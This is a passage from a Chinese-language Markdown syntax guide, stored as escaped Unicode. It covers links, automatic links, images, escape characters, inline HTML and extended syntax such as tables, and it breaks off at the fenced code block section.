\u8981\u521b\u5efa\u5185\u8054\u94fe\u63a5\uff0c\u8bf7\u5728\u94fe\u63a5\u6587\u672c\u7684\u53f3\u65b9\u62ec\u53f7\u4e4b\u540e\u7acb\u5373\u4f7f\u7528\u4e00\u7ec4\u5e38\u89c4\u62ec\u53f7\u3002\u5728\u62ec\u53f7\u5185\uff0c\u5c06 URL \u653e\u5728\u60a8\u5e0c\u671b\u94fe\u63a5\u6307\u5411\u7684\u4f4d\u7f6e\uff0c\u4ee5\u53ca\u94fe\u63a5\u7684 \u53ef\u9009 \u6807\u9898\uff0c\u5e76\u7528\u5f15\u53f7\u62ec\u8d77\u6765\u3002\u4f8b\u5982\uff1a This is [an example](http://example.com/ \"Title\") inline link. [This link](http://example.net/) has no title attribute. \u5c06\u4ea7\u751f\uff1a This is an example inline link. This link has no title attribute. \u5982\u679c\u60a8\u6307\u7684\u662f\u540c\u4e00\u670d\u52a1\u5668\u4e0a\u7684\u672c\u5730\u8d44\u6e90\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\uff1a See my [About](/about/) page for details. 2.8.2. \u5f15\u7528\u94fe\u63a5 \uf0c1 \u5f15\u7528\u6837\u5f0f\u94fe\u63a5\u4f7f\u7528\u7b2c\u4e8c\u7ec4\u65b9\u62ec\u53f7\uff0c\u60a8\u53ef\u4ee5\u5728\u5176\u4e2d\u653e\u7f6e\u60a8\u9009\u62e9\u7684\u6807\u7b7e\u6765\u6807\u8bc6\u94fe\u63a5\uff0c\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528\u7a7a\u683c\u6765\u5206\u9694\u62ec\u53f7\u7ec4\uff1a This is [an example][id] reference-style link. This is [an example] [id] reference-style link. \u7136\u540e\uff0c\u5728\u6587\u6863\u4e2d\u7684\u4efb\u4f55\u4f4d\u7f6e\uff0c\u60a8\u90fd\u53ef\u4ee5\u50cf\u8fd9\u6837\u5728\u4e00\u884c\u4e0a\u5b9a\u4e49\u94fe\u63a5\u6807\u7b7e\uff1a [id]: http://example.com/ \"Optional Title Here\" \u5f15\u7528\u7c7b\u578b\u94fe\u63a5\u7684\u7b2c\u4e8c\u90e8\u5206\u4f7f\u7528\u4ee5\u4e0b\u5c5e\u6027\u8bbe\u7f6e\u683c\u5f0f\uff1a \u5305\u542b\u94fe\u63a5\u6807\u8bc6\u7b26\u7684\u65b9\u62ec\u53f7\uff08\u53ef\u9009\u4ece\u5de6\u8fb9\u8ddd\u7f29\u8fdb\u6700\u591a\u4e09\u4e2a\u7a7a\u683c\uff09\uff1b \u540e\u8ddf\u4e00\u4e2a\u5192\u53f7\uff1b \u540e\u8ddf\u4e00\u4e2a\u6216\u591a\u4e2a\u7a7a\u683c\uff08\u6216\u5236\u8868\u7b26\uff09\uff1b \u540e\u8ddf\u94fe\u63a5\u7684 URL\uff1b \u53ef\u9009\u5730\u540e\u8ddf\u94fe\u63a5\u7684\u6807\u9898\u5c5e\u6027\uff0c\u7528\u53cc\u5f15\u53f7\u6216\u5355\u5f15\u53f7\u62ec\u8d77\u6765\uff0c\u6216\u8005\u7528\u62ec\u53f7\u62ec\u8d77\u6765\u3002 \u4ee5\u4e0b\u51e0\u79cd\u94fe\u63a5\u5b9a\u4e49\u662f\u7b49\u4ef7\u7684\uff1a [foo]: http://example.com/ \"Optional Title Here\" [foo]: http://example.com/ 'Optional Title Here' [foo]: http://example.com/ (Optional Title Here) \u94fe\u63a5 URL \u53ef\u4ee5\u9009\u62e9\u7528\u5c16\u62ec\u53f7\u62ec\u8d77\u6765\uff1a [id]: <http://example.com/> \"Optional Title Here\" \u60a8\u53ef\u4ee5\u5c06 title \u5c5e\u6027\u653e\u5728\u4e0b\u4e00\u884c\u5e76\u4f7f\u7528\u989d\u5916\u7684\u7a7a\u683c\u6216\u5236\u8868\u7b26\u8fdb\u884c\u586b\u5145\uff0c\u8fd9\u5bf9\u4e8e\u8f83\u957f\u7684 URL \u770b\u8d77\u6765\u4f1a\u66f4\u597d\uff1a [id]: http://example.com/longish/path/to/resource/here \"Optional Title Here\" \u94fe\u63a5\u5b9a\u4e49\u4ec5\u7528\u4e8e\u5728 Markdown \u5904\u7406\u671f\u95f4\u521b\u5efa\u94fe\u63a5\uff0c\u5e76\u5728 HTML \u8f93\u51fa\u4e2d\u4ece\u60a8\u7684\u6587\u6863\u4e2d\u5220\u9664\u3002 \u94fe\u63a5\u5b9a\u4e49\u540d\u79f0\u53ef\u80fd\u5305\u542b\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7a7a\u683c\u548c\u6807\u70b9\u7b26\u53f7\u2014\u2014\u4f46\u5b83\u4eec\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u3002\u4f8b\u5982\u8fd9\u4e24\u4e2a\u94fe\u63a5\u662f\u7b49\u4ef7\u7684\uff1a [link text][a] [link text][A] 2.8.3. \u9690\u5f0f\u94fe\u63a5 \uf0c1 \u9690\u5f0f\u94fe\u63a5\u65b9\u5f0f\u5141\u8bb8\u60a8\u7701\u7565\u94fe\u63a5\u540d\u79f0\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u94fe\u63a5\u6587\u672c\u672c\u8eab\u7528\u4f5c\u540d\u79f0\u3002\u53ea\u9700\u4f7f\u7528\u4e00\u7ec4\u7a7a\u65b9\u62ec\u53f7\u2014\u2014\u4f8b\u5982\uff0c\u5c06\u201cGoogle\u201d\u8fd9\u4e2a\u8bcd\u94fe\u63a5\u5230 google.com \u7f51\u7ad9\uff0c\u4f60\u53ef\u4ee5\u7b80\u5355\u5730\u5199\uff1a [Google][] [Google]: http://google.com/ \u56e0\u4e3a\u94fe\u63a5\u540d\u79f0\u53ef\u80fd\u5305\u542b\u7a7a\u683c\uff0c\u6240\u4ee5\u6b64\u5feb\u6377\u65b9\u5f0f\u751a\u81f3\u9002\u7528\u4e8e\u94fe\u63a5\u6587\u672c\u4e2d\u7684\u591a\u4e2a\u5355\u8bcd\uff1a Visit [Daring Fireball][] for more information. [Daring Fireball]: http://daringfireball.net/ 2.8.4. \u81ea\u52a8\u94fe\u63a5 \uf0c1 Markdown \u652f\u6301\u4e3a URL \u548c\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u521b\u5efa\u201c\u81ea\u52a8\u201d\u94fe\u63a5\u7684\u5feb\u6377\u65b9\u5f0f\uff1a\u53ea\u9700\u5c06 URL \u6216\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u7528\u5c16\u62ec\u53f7\u62ec\u8d77\u6765\u3002\u8fd9\u610f\u5473\u7740\uff0c\u5982\u679c\u60a8\u60f3\u663e\u793a URL \u6216\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u7684\u5b9e\u9645\u6587\u672c\uff0c\u5e76\u4f7f\u5176\u6210\u4e3a\u53ef\u70b9\u51fb\u7684\u94fe\u63a5\uff0c\u60a8\u53ef\u4ee5\u8fd9\u6837\u505a\uff1a <http://example.com/> Markdown \u4f1a\u5c06\u5176\u53d8\u6210\uff1a <a href=\"http://example.com/\">http://example.com/</a> \u7535\u5b50\u90ae\u4ef6\u5730\u5740\u7684\u81ea\u52a8\u94fe\u63a5\u7684\u5de5\u4f5c\u65b9\u5f0f\u7c7b\u4f3c\uff0c\u9664\u4e86 Markdown \u8fd8\u5c06\u6267\u884c\u4e00\u4e9b\u968f\u673a\u7684\u5341\u8fdb\u5236\u548c\u5341\u516d\u8fdb\u5236\u5b9e\u4f53\u7f16\u7801\uff0c\u4ee5\u5e2e\u52a9\u4ece\u5730\u5740\u6536\u96c6\u5783\u573e\u90ae\u4ef6\u673a\u5668\u4eba\u4e2d\u9690\u85cf\u60a8\u7684\u5730\u5740\u3002\u4f8b\u5982\uff0cMarkdown \u4f1a\u5c06\u8fd9\u6837\uff1a <address@example.com> \u53d8\u6210\u8fd9\u6837\u7684\u4e1c\u897f\uff1a <a href=\"&#x6D;&#x61;i&#x6C;&#x74;&#x6F;:&#x61;&#x64;&#x64;&#x72;&#x65; &#115;&#115;&#64;&#101;&#120;&#x61;&#109;&#x70;&#x6C;e&#x2E;&#99;&#111; &#109;\">&#x61;&#x64;&#x64;&#x72;&#x65;&#115;&#115;&#64;&#101;&#120;&#x61; &#109;&#x70;&#x6C;e&#x2E;&#99;&#111;&#109;</a> \u5b83\u5c06\u5728\u6d4f\u89c8\u5668\u4e2d\u5448\u73b0\u4e3a\u201caddress@example.com\u201d\u7684\u53ef\u70b9\u51fb\u94fe\u63a5\u3002 \uff08\u8fd9\u79cd\u5b9e\u4f53\u7f16\u7801\u6280\u5de7\u786e\u5b9e\u4f1a\u6b3a\u9a97\u8bb8\u591a\uff08\u5982\u679c\u4e0d\u662f\u5927\u591a\u6570\uff09\u5730\u5740\u6536\u96c6\u673a\u5668\u4eba\uff0c\u4f46\u5b83\u80af\u5b9a\u4e0d\u4f1a\u6b3a\u9a97\u6240\u6709\u8fd9\u4e9b\u3002\u603b\u6bd4\u6ca1\u6709\u597d\uff0c\u4f46\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u53d1\u5e03\u7684\u5730\u5740\u6700\u7ec8\u53ef\u80fd\u4f1a\u5f00\u59cb\u63a5\u6536\u5783\u573e\u90ae\u4ef6\u3002\uff09 2.8.5. \u5e26\u683c\u5f0f\u7684\u94fe\u63a5 \uf0c1 \u5f3a\u8c03 \u94fe\u63a5, \u5728\u94fe\u63a5\u8bed\u6cd5\u524d\u540e\u589e\u52a0\u661f\u53f7\u3002 \u8981\u5c06\u94fe\u63a5\u8868\u793a\u4e3a\u4ee3\u7801\uff0c\u8bf7\u5728\u65b9\u62ec\u53f7\u4e2d\u6dfb\u52a0\u53cd\u5f15\u53f7\u3002 I love supporting the **[EFF](https://eff.org)**. This is the *[Markdown Guide](https://www.markdownguide.org)*. See the section on [`code`](#code). \u6e32\u67d3\u6548\u679c\u5982\u4e0b\uff1a I love supporting the EFF . This is the Markdown Guide . See the section on code . 2.8.6. \u793a\u4f8b\u8bf4\u660e \uf0c1 \u94fe\u63a5\u5b9a\u4e49\u53ef\u4ee5\u653e\u5728 Markdown \u6587\u6863\u4e2d\u7684\u4efb\u4f55\u4f4d\u7f6e\u3002\u6211\u503e\u5411\u4e8e\u5c06\u5b83\u4eec\u653e\u5728\u4f7f\u7528\u5b83\u4eec\u7684\u6bcf\u4e2a\u6bb5\u843d\u4e4b\u540e\uff0c\u4f46\u662f\u5982\u679c\u60a8\u613f\u610f\uff0c\u53ef\u4ee5\u5c06\u5b83\u4eec\u5168\u90e8\u653e\u5728\u6587\u6863\u7684\u672b\u5c3e\uff0c\u6709\u70b9\u50cf\u811a\u6ce8\u3002 \u4ee5\u4e0b\u662f\u5b9e\u9645\u53c2\u8003\u94fe\u63a5\u7684\u793a\u4f8b\uff1a I get 10 times more traffic from [Google] [1] than from [Yahoo] [2] or [MSN] [3]. [1]: http://google.com/ \"Google\" [2]: http://search.yahoo.com/ \"Yahoo Search\" [3]: http://search.msn.com/ \"MSN Search\" \u4f7f\u7528\u9690\u5f0f\u94fe\u63a5\u540d\u79f0\u5feb\u6377\u65b9\u5f0f\uff0c\u60a8\u53ef\u4ee5\u6539\u4e3a\u7f16\u5199\uff1a I get 10 times more traffic from [Google][] than from [Yahoo][] or [MSN][]. [google]: http://google.com/ \"Google\" [yahoo]: http://search.yahoo.com/ \"Yahoo Search\" [msn]: http://search.msn.com/ \"MSN Search\" \u4e3a\u4e86\u6bd4\u8f83\uff0c\u8fd9\u91cc\u662f\u4f7f\u7528 Markdown \u7684\u5185\u8054\u94fe\u63a5\u6837\u5f0f\u7f16\u5199\u7684\u76f8\u540c\u6bb5\u843d\uff1a I get 10 times more traffic from [Google](http://google.com/ \"Google\") than from [Yahoo](http://search.yahoo.com/ \"Yahoo Search\") or [MSN](http://search.msn.com/ \"MSN Search\"). \u5f15\u7528\u98ce\u683c\u94fe\u63a5\u7684\u91cd\u70b9\u4e0d\u662f\u5b83\u4eec\u66f4\u5bb9\u6613\u7f16\u5199\u3002\u5173\u952e\u662f\uff0c\u4f7f\u7528\u5f15\u7528\u6837\u5f0f\u7684\u94fe\u63a5\uff0c\u60a8\u7684\u6587\u6863\u6e90\u4ee3\u7801\u7684\u53ef\u8bfb\u6027\u5927\u5927\u63d0\u9ad8\u3002\u6bd4\u8f83\u4e0a\u9762\u7684\u4f8b\u5b50\uff1a\u4f7f\u7528\u5f15\u7528\u6837\u5f0f\u7684\u94fe\u63a5\uff0c\u6bb5\u843d\u672c\u8eab\u53ea\u6709 81 \u4e2a\u5b57\u7b26\u957f\uff1b\u4f7f\u7528\u5185\u8054\u6837\u5f0f\u7684\u94fe\u63a5\uff0c\u5b83\u662f 176 \u4e2a\u5b57\u7b26\uff1b\u4f5c\u4e3a\u539f\u59cb HTML\uff0c\u5b83\u662f 234 \u4e2a\u5b57\u7b26\u3002\u5728\u539f\u59cb HTML \u4e2d\uff0c\u6807\u8bb0\u6bd4\u6587\u672c\u591a\u3002 \u4f7f\u7528 Markdown \u7684\u5f15\u7528\u6837\u5f0f\u94fe\u63a5\uff0c\u6e90\u6587\u6863\u66f4\u63a5\u8fd1\u4e8e\u6700\u7ec8\u8f93\u51fa\uff0c\u5982\u5728\u6d4f\u89c8\u5668\u4e2d\u5448\u73b0\u7684\u90a3\u6837\u3002\u901a\u8fc7\u5141\u8bb8\u60a8\u5c06\u4e0e\u6807\u8bb0\u76f8\u5173\u7684\u5143\u6570\u636e\u79fb\u51fa\u6bb5\u843d\uff0c\u60a8\u53ef\u4ee5\u6dfb\u52a0\u94fe\u63a5\u800c\u4e0d\u4f1a\u4e2d\u65ad\u6563\u6587\u7684\u53d9\u8ff0\u6d41\u7a0b\u3002 2.9. \u56fe\u7247\u8bed\u6cd5 \uf0c1 Markdown \u4f7f\u7528\u7684\u56fe\u50cf\u8bed\u6cd5\u65e8\u5728\u7c7b\u4f3c\u4e8e\u94fe\u63a5\u7684\u8bed\u6cd5\uff0c\u5141\u8bb8\u4e24\u79cd\u6837\u5f0f\uff1a\u5185\u8054(inline)\u548c\u5f15\u7528(reference)\u3002 \u5185\u8054\u56fe\u50cf\u8bed\u6cd5\u5982\u4e0b\u6240\u793a\uff1a ![Alt text](/path/to/img.jpg) ![Alt text](/path/to/img.jpg \"Optional title\") \u5185\u8054\u56fe\u50cf\u8bed\u6cd5\u683c\u5f0f\uff1a \u611f\u53f9\u53f7\uff1a!; \u540e\u8ddf\u4e00\u7ec4\u65b9\u62ec\u53f7\uff0c\u5305\u542b\u56fe\u50cf\u7684\u5c5e\u6027\u6587\u672c\uff1b \u540e\u8ddf\u4e00\u7ec4\u62ec\u53f7\uff0c\u5305\u542b\u56fe\u50cf\u7684 URL \u6216\u8def\u5f84\uff0c\u4ee5\u53ca title \u7528\u53cc\u5f15\u53f7\u6216\u5355\u5f15\u53f7\u62ec\u8d77\u6765\u7684\u53ef\u9009\u5c5e\u6027\u3002 \u56fe\u50cf\u5f15\u7528\u4f7f\u7528\u4e0e\u94fe\u63a5\u5f15\u7528\u76f8\u540c\u7684\u8bed\u6cd5\u5b9a\u4e49\u3002\u5f15\u7528\u98ce\u683c\u7684\u56fe\u50cf\u8bed\u6cd5\u5982\u4e0b\u6240\u793a\uff1a ![Alt text][id] [id]: url/to/image \"Optional title attribute\" \u5176\u4e2d\u201cid\u201d\u662f\u5b9a\u4e49\u7684\u56fe\u50cf\u5f15\u7528\u7684\u540d\u79f0\u3002 \u5728\u64b0\u5199\u672c\u6587\u65f6\uff0cMarkdown \u6ca1\u6709\u7528\u4e8e\u6307\u5b9a\u56fe\u50cf\u5c3a\u5bf8\u7684\u8bed\u6cd5\u3002\u5982\u679c\u8fd9\u5bf9\u60a8\u5f88\u91cd\u8981\uff0c\u60a8\u53ef\u4ee5\u7b80\u5355\u5730\u4f7f\u7528\u5e38\u89c4 HTML <img> \u6807\u7b7e\u3002 \u7ed9\u56fe\u7247\u589e\u52a0\u94fe\u63a5\uff0c\u8bf7\u5c06\u56fe\u50cf\u7684Markdown \u62ec\u5728\u65b9\u62ec\u53f7\u4e2d\uff0c\u7136\u540e\u5c06\u94fe\u63a5\u6dfb\u52a0\u5728\u5706\u62ec\u53f7\u4e2d\uff1a [![image text](/assets/img/shiprock.jpg \"Optional title\")](https://jerry-se.github.io/) 2.10. \u8f6c\u4e49\u5b57\u7b26 \uf0c1 Markdown \u5141\u8bb8\u4f7f\u7528\u53cd\u659c\u6760\u8f6c\u4e49\u6765\u751f\u6210\u6587\u5b57\u5b57\u7b26\uff0c\u5426\u5219\u8fd9\u4e9b\u5b57\u7b26\u5728 Markdown \u7684\u683c\u5f0f\u5316\u8bed\u6cd5\u4e2d\u5177\u6709\u7279\u6b8a\u542b\u4e49\u3002\u4f8b\u5982\uff0c\u5982\u679c\u60f3\u7528\u6587\u5b57\u661f\u53f7\uff08\u800c\u4e0d\u662f HTML <em> \u6807\u8bb0\uff09\u5305\u56f4\u4e00\u4e2a\u5355\u8bcd\uff0c\u53ef\u4ee5\u5728\u661f\u53f7\u4e4b\u524d\u4f7f\u7528\u53cd\u659c\u6760\uff0c\u5982\u4e0b\u6240\u793a\uff1a \\*literal asterisks\\* Markdown \u4e3a\u4ee5\u4e0b\u5b57\u7b26\u63d0\u4f9b\u53cd\u659c\u6760\u8f6c\u4e49\uff1a Character Name \\ backslash ` backtick * asterisk _ underscore {} curly braces [] square brackets () parentheses # hash mark + plus sign - minus sign (hyphen) . dot ! exclamation mark 2.11. \u5185\u5d4c HTML \u6807\u7b7e \uf0c1 \u5bf9\u4e8e Markdown \u6db5\u76d6\u8303\u56f4\u4e4b\u5916\u7684\u6807\u7b7e\uff0c\u90fd\u53ef\u4ee5\u76f4\u63a5\u5728\u6587\u4ef6\u91cc\u9762\u7528 HTML \u672c\u8eab\u3002\u5982\u9700\u4f7f\u7528 HTML\uff0c\u4e0d\u9700\u8981\u989d\u5916\u6807\u6ce8\u8fd9\u662f HTML \u6216\u662f Markdown\uff0c\u53ea\u9700 HTML \u6807\u7b7e\u6dfb\u52a0\u5230 Markdown \u6587\u672c\u4e2d\u5373\u53ef\u3002 2.11.1. \u884c\u7ea7\u5185\u5d4c\u6807\u7b7e \uf0c1 HTML \u7684\u884c\u7ea7\u5167\u8054\u6807\u7b7e\u5982 <span> \u3001 <cite> \u3001 <del> \u4e0d\u53d7\u9650\u5236\uff0c\u53ef\u4ee5\u5728 Markdown \u7684\u6bb5\u843d\u3001\u5217\u8868\u6216\u662f\u6807\u9898\u91cc\u4efb\u610f\u4f7f\u7528\u3002\u4f9d\u7167\u4e2a\u4eba\u4e60\u60ef\uff0c\u751a\u81f3\u53ef\u4ee5\u4e0d\u7528 Markdown \u683c\u5f0f\uff0c\u800c\u91c7\u7528 HTML \u6807\u7b7e\u6765\u683c\u5f0f\u5316\u3002\u4f8b\u5982\uff1a\u5982\u679c\u6bd4\u8f83\u559c\u6b22 HTML \u7684 <a> \u6216 <img> \u6807\u7b7e\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e9b\u6807\u7b7e\uff0c\u800c\u4e0d\u7528 Markdown \u63d0\u4f9b\u7684\u94fe\u63a5\u6216\u662f\u56fe\u7247\u8bed\u6cd5\u3002\u5f53\u4f60\u9700\u8981\u66f4\u6539\u5143\u7d20\u7684\u5c5e\u6027\u65f6\uff08\u4f8b\u5982\u4e3a\u6587\u672c\u6307\u5b9a\u989c\u8272\u6216\u66f4\u6539\u56fe\u50cf\u7684\u5bbd\u5ea6\uff09\uff0c\u4f7f\u7528 HTML \u6807\u7b7e\u66f4\u65b9\u4fbf\u4e9b\u3002 HTML \u884c\u7ea7\u5167\u8054\u6807\u7b7e\u548c\u533a\u5757\u6807\u7b7e\u4e0d\u540c\uff0c\u5728\u5167\u8054\u6807\u7b7e\u7684\u8303\u56f4\u5185\uff0c Markdown \u7684\u8bed\u6cd5\u662f\u53ef\u4ee5\u89e3\u6790\u7684\u3002\u4f8b\u5982\uff1a This **word** is bold. This <em>word</em> is italic. 2.11.2. \u5757\u7ea7\u6807\u7b7e \uf0c1 \u533a\u5757\u5143\u7d20\u2500\u2500\u6bd4\u5982 <div> \u3001 <table> \u3001 <pre> \u3001 <p> \u7b49\u6807\u7b7e\uff0c\u5fc5\u987b\u5728\u524d\u540e\u52a0\u4e0a\u7a7a\u884c\uff0c\u4ee5\u4fbf\u4e8e\u5185\u5bb9\u533a\u5206\u3002\u800c\u4e14\u8fd9\u4e9b\u5143\u7d20\u7684\u5f00\u59cb\u4e0e\u7ed3\u5c3e\u6807\u7b7e\uff0c\u4e0d\u53ef\u4ee5\u7528 tab \u6216\u662f\u7a7a\u767d\u6765\u7f29\u8fdb\u3002Markdown \u4f1a\u81ea\u52a8\u8bc6\u522b\u8fd9\u533a\u5757\u5143\u7d20\uff0c\u907f\u514d\u5728\u533a\u5757\u6807\u7b7e\u524d\u540e\u52a0\u4e0a\u6ca1\u6709\u5fc5\u8981\u7684 <p> \u6807\u7b7e\u3002 \u4f8b\u5982\uff0c\u5728 Markdown \u6587\u4ef6\u91cc\u52a0\u4e0a\u4e00\u6bb5 HTML \u8868\u683c\uff1a This is a regular paragraph. <table> <tr> <td>Foo</td> </tr> </table> This is another regular paragraph. \u8bf7\u6ce8\u610f\uff0cMarkdown \u8bed\u6cd5\u5728 HTML \u533a\u5757\u6807\u7b7e\u4e2d\u5c06\u4e0d\u4f1a\u88ab\u8fdb\u884c\u5904\u7406\u3002\u4f8b\u5982 <p>italic and **bold**</p> \uff0c\u4f60\u65e0\u6cd5\u5728 HTML \u533a\u5757\u5185\u4f7f\u7528 Markdown \u5f62\u5f0f\u7684 \u5f3a\u8c03 \u3002 2.11.3. \u6298\u53e0\u793a\u4f8b \uf0c1 <details> <summary>\u5c55\u5f00\u67e5\u770b</summary> AAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAA </details> 2.11.4. \u53ef\u7528\u6027 \uf0c1 \u51fa\u4e8e\u5b89\u5168\u539f\u56e0\uff0c\u5e76\u975e\u6240\u6709 Markdown \u5e94\u7528\u7a0b\u5e8f\u90fd\u652f\u6301\u5728 Markdown \u6587\u6863\u4e2d\u6dfb\u52a0 HTML\u3002\u5982\u6709\u7591\u95ee\uff0c\u8bf7\u67e5\u770b\u76f8\u5e94 Markdown \u5e94\u7528\u7a0b\u5e8f\u7684\u624b\u518c\u3002\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u53ea\u652f\u6301 HTML \u6807\u7b7e\u7684\u5b50\u96c6\u3002 3. \u6269\u5c55\u8bed\u6cd5 \uf0c1 John Gruber\u7684\u539f\u59cb\u8bbe\u8ba1\u6587\u6863\u4e2d\u6982\u8ff0\u7684 \u57fa\u672c\u8bed\u6cd5 \u4e3b\u8981\u662f\u4e3a\u4e86\u5e94\u4ed8\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u7684\u65e5\u5e38\u6240\u9700\u5143\u7d20\uff0c\u4f46\u5bf9\u4e8e\u67d0\u4e9b\u4eba\u6765\u8bf4\u8fd8\u4e0d\u591f\uff0c\u8fd9\u5c31\u662f\u6269\u5c55\u8bed\u6cd5\u7684\u7528\u6b66\u4e4b\u5730\u3002 \u4e00\u4e9b\u4e2a\u4eba\u548c\u7ec4\u7ec7\u5f00\u59cb\u901a\u8fc7\u6dfb\u52a0\u5176\u4ed6\u5143\u7d20\uff08\u4f8b\u5982\u8868\uff0c\u4ee3\u7801\u5757\uff0c\u8bed\u6cd5\u7a81\u51fa\u663e\u793a\uff0cURL\u81ea\u52a8\u94fe\u63a5\u548c\u811a\u6ce8\uff09\u6765\u6269\u5c55\u57fa\u672c\u8bed\u6cd5\u3002\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u57fa\u4e8e\u57fa\u672cMarkdown\u8bed\u6cd5\u7684\u8f7b\u91cf\u7ea7\u6807\u8bb0\u8bed\u8a00\uff0c\u6216\u901a\u8fc7\u5411\u517c\u5bb9\u7684Markdown\u5904\u7406\u5668\u6dfb\u52a0\u6269\u5c55\u6765\u542f\u7528\u8fd9\u4e9b\u5143\u7d20\u3002 3.1. \u6269\u5c55\u7684\u53ef\u7528\u6027 \uf0c1 \u5e76\u975e\u6240\u6709Markdown\u5e94\u7528\u7a0b\u5e8f\u90fd\u652f\u6301\u6269\u5c55\u8bed\u6cd5\u5143\u7d20\u3002\u60a8\u9700\u8981\u68c0\u67e5\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u8f7b\u91cf\u7ea7\u6807\u8bb0\u8bed\u8a00\u662f\u5426\u652f\u6301\u60a8\u8981\u4f7f\u7528\u7684\u6269\u5c55\u8bed\u6cd5\u5143\u7d20\u3002\u5982\u679c\u6ca1\u6709\uff0c\u90a3\u4e48\u4ecd\u7136\u6709\u53ef\u80fd\u5728Markdown\u5904\u7406\u5668\u4e2d\u542f\u7528\u6269\u5c55\u3002 \u6709\u51e0\u79cd\u8f7b\u91cf\u7ea7\u6807\u8bb0\u8bed\u8a00\u662fMarkdown\u7684\u8d85\u96c6\u3002\u5b83\u4eec\u5305\u542bGruber\u7684\u57fa\u672c\u8bed\u6cd5\uff0c\u5e76\u901a\u8fc7\u6dfb\u52a0\u5176\u4ed6\u5143\u7d20\uff08\u4f8b\u5982\u8868\uff0c\u4ee3\u7801\u5757\uff0c\u8bed\u6cd5\u7a81\u51fa\u663e\u793a\uff0cURL\u81ea\u52a8\u94fe\u63a5\u548c\u811a\u6ce8\uff09\u5728\u6b64\u57fa\u7840\u4e0a\u6784\u5efa\u3002\u8bb8\u591a\u6700\u53d7\u6b22\u8fce\u7684Markdown\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u4ee5\u4e0b\u8f7b\u91cf\u7ea7\u6807\u8bb0\u8bed\u8a00\u4e4b\u4e00\uff1a CommonMark GitHub Flavored Markdown (GFM) Markdown Extra MultiMarkdown R Markdown \u6709\u8bb8\u591a Markdown\u5904\u7406\u5668 \u53ef\u7528\u3002\u5b83\u4eec\u4e2d\u7684\u8bb8\u591a\u5141\u8bb8\u60a8\u6dfb\u52a0\u542f\u7528\u6269\u5c55\u8bed\u6cd5\u5143\u7d20\u7684\u6269\u5c55\u3002\u67e5\u770b\u60a8\u6240\u4f7f\u7528\u5904\u7406\u5668\u7684\u6587\u6863\u4ee5\u83b7\u53d6\u66f4\u591a\u4fe1\u606f\u3002 3.2. \u8868\u683c \uf0c1 \u8981\u6dfb\u52a0\u8868\uff0c\u8bf7\u4f7f\u7528\u4e09\u4e2a\u6216\u591a\u4e2a\u8fde\u5b57\u7b26\uff08 --- \uff09\u521b\u5efa\u6bcf\u5217\u7684\u6807\u9898\uff0c\u5e76\u4f7f\u7528\u7ba1\u9053\uff08 | \uff09\u5206\u9694\u6bcf\u5217\u3002\u60a8\u53ef\u4ee5\u9009\u62e9\u5728\u8868\u7684\u4efb\u4e00\u7aef\u6dfb\u52a0\u7ba1\u9053\uff0c\u5355\u5143\u683c\u5bbd\u5ea6\u53ef\u4ee5\u53d8\u5316\u3002 \u4f7f\u7528\u8fde\u5b57\u7b26\u548c\u7ba1\u9053\u521b\u5efa\u8868\u53ef\u80fd\u5f88\u9ebb\u70e6\u3002\u4e3a\u4e86\u52a0\u5feb\u8be5\u8fc7\u7a0b\uff0c\u8bf7\u5c1d\u8bd5\u4f7f\u7528 Markdown Tables Generator \u3002\u4f7f\u7528\u56fe\u5f62\u754c\u9762\u6784\u5efa\u8868\uff0c\u7136\u540e\u5c06\u751f\u6210\u7684Markdown\u683c\u5f0f\u7684\u6587\u672c\u590d\u5236\u5230\u6587\u4ef6\u4e2d\u3002 name | age ---- | --- LearnShare | 12 Mike | 32 \u5728\u8868\u5934\u4e0b\u65b9\u7684\u5206\u9694\u7ebf\u6807\u8bb0\u4e2d\u52a0\u5165 : \uff0c\u5373\u53ef\u6807\u8bb0\u4e0b\u65b9\u5355\u5143\u683c\u5185\u5bb9\u7684\u5bf9\u9f50\u65b9\u5f0f\uff1a :--- \u4ee3\u8868\u5de6\u5bf9\u9f50 :--: \u4ee3\u8868\u5c45\u4e2d\u5bf9\u9f50 ---: \u4ee3\u8868\u53f3\u5bf9\u9f50 | left | center | right | | :--- | :----: | ----: | | aaaa | bbbbbb | ccccc | | a | b | c | \u60a8\u53ef\u4ee5\u5728\u8868\u683c\u4e2d\u8bbe\u7f6e\u6587\u672c\u683c\u5f0f\u3002\u4f8b\u5982\uff0c\u60a8\u53ef\u4ee5\u6dfb\u52a0\u94fe\u63a5\uff0c\u4ee3\u7801\uff08\u4ec5\u53cd\u5f15\u53f7\uff08 ` \uff09\u4e2d\u7684\u5355\u8bcd\u6216\u77ed\u8bed\uff0c\u800c\u4e0d\u662f\u4ee3\u7801\u5757\uff09\u548c\u5f3a\u8c03\u3002 \u60a8\u4e0d\u80fd\u6dfb\u52a0\u6807\u9898\uff0c\u5757\u5f15\u7528\uff0c\u5217\u8868\uff0c\u6c34\u5e73\u89c4\u5219\uff0c\u56fe\u50cf\u6216HTML\u6807\u7b7e\u3002 \u60a8\u53ef\u4ee5\u4f7f\u7528\u8868\u683c\u7684HTML\u5b57\u7b26\u4ee3\u7801\uff08 &#124; \uff09\u5728\u8868\u4e2d\u663e\u793a\u7ad6\u7ebf\uff08 | \uff09\u5b57\u7b26\u3002 3.3. \u56f4\u680f\u4ee3\u7801\u5757 \uf0c1 